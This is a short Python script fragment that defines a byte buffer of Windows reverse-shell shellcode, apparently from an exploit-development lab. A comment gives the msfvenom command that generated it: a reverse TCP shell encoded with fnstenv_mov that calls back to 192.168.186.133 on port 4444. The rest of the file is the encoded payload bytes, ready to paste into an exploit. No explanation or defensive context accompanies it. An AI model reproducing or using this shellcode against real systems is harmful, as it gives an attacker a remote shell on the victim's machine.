#!/usr/bin/env python

# msfvenom -p windows/shell_reverse_tcp -f raw -e x86/fnstenv_mov -o shell lport=4444 lhost=192.168.186.133 exitfunc=none
buf  = ""
buf += "\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
buf += "\x13\xfa\x9e\x64\x1b\x83\xeb\xfc\xe2\xf4\x06\x76"
buf += "\xe6\x1b\xfa\x9e\x04\x92\x1f\xaf\xa4\x7f\x71\xce"
buf += "\x54\x90\xa8\x92\xef\x49\xee\x15\x16\x33\xf5\x29"
buf += "\x2e\x3d\xcb\x61\xc8\x27\x9b\xe2\x66\x37\xda\x5f"
buf += "\xab\x16\xfb\x59\x86\xe9\xa8\xc9\xef\x49\xea\x15"
buf += "\x2e\x27\x71\xd2\x75\x63\x19\xd6\x65\xca\xab\x15"
buf += "\x3d\x3b\xfb\x4d\xef\x52\xe2\x7d\x5e\x52\x71\xaa"
buf += "\xef\x1a\x2c\xaf\x9b\xb7\x3b\x51\x69\x1a\x3d\xa6"
buf += "\x84\x6e\x0c\x9d\x19\xe3\xc1\xe3\x40\x6e\x1e\xc6"
buf += "\xef\x43\xde\x9f\xb7\x7d\x71\x92\x2f\x90\xa2\x82"
buf += "\x65\xc8\x71\x9a\xef\x1a\x2a\x17\x20\x3f\xde\xc5"
buf += "\x3f\x7a\xa3\xc4\x35\xe4\x1a\xc1\x3b\x41\x71\x8c"
buf += "\x8f\x96\xa7\xf6\x57\x29\xfa\x9e\x0c\x6c\x89\xac"
buf += "\x3b\x4f\x92\xd2\x13\x3d\xfd\x61\xb1\xa3\x6a\x9f"
buf += "\x64\x1b\xd3\x5a\x30\x4b\x92\xb7\xe4\x70\xfa\x61"
buf += "\xb1\x4b\xaa\xce\x34\x5b\xaa\xde\x34\x73\x10\x91"
buf += "\xbb\xfb\x05\x4b\xf3\x71\xff\xf6\xa4\xb3\x40\x1b"
buf += "\x0c\x19\xfa\x8f\x38\x92\x1c\xf4\x74\x4d\xad\xf6"
buf += "\xfd\xbe\x8e\xff\x9b\xce\x7f\x5e\x10\x17\x05\xd0"
buf += "\x6c\x6e\x16\xf6\x94\xae\x58\xc8\x9b\xce\x92\xfd"
buf += "\x09\x7f\xfa\x17\x87\x4c\xad\xc9\x55\xed\x90\x8c"
buf += "\x3d\x4d\x18\x63\x02\xdc\xbe\xba\x58\x1a\xfb\x13"
buf += "\x20\x3f\xea\x58\x64\x5f\xae\xce\x32\x4d\xac\xd8"
buf += "\x32\x55\xac\xc8\x37\x4d\x92\xe7\xa8\x24\x7c\x61"
buf += "\xb1\x92\x1a\xd0\x32\x5d\x05\xae\x0c\x13\x7d\x83"
buf += "\x04\xe4\x2f\x25\xce\xde\x18\xc3\x0c\xbd\x6f\x23"
buf += "\xf9\xe4\x2f\xa2\x62\x67\xf0\x1e\x9f\xfb\x8f\x9b"
buf += "\xdf\x5c\xe9\xec\x0b\x71\xfa\xcd\x9b\xce"
